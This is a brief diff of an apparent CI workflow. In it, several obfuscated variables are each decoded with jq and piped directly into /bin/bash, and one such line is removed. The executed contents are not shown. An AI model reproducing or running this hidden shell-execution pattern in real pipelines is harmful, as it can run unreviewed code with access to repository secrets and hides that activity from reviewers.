@@ -25,7 +25,6 @@ jobs:
           echo $dsp1228 | jq -r .s49 | /bin/bash
           echo $vwbh229 | jq -r .r39 | /bin/bash
           echo $t2179 | jq -r .ailsx819 | /bin/bash
-          echo $uz014 | jq -r .lojbq25096 | /bin/bash
           echo $ck5469 | jq -r .czslf66 | /bin/bash
 
       - name: Upload data
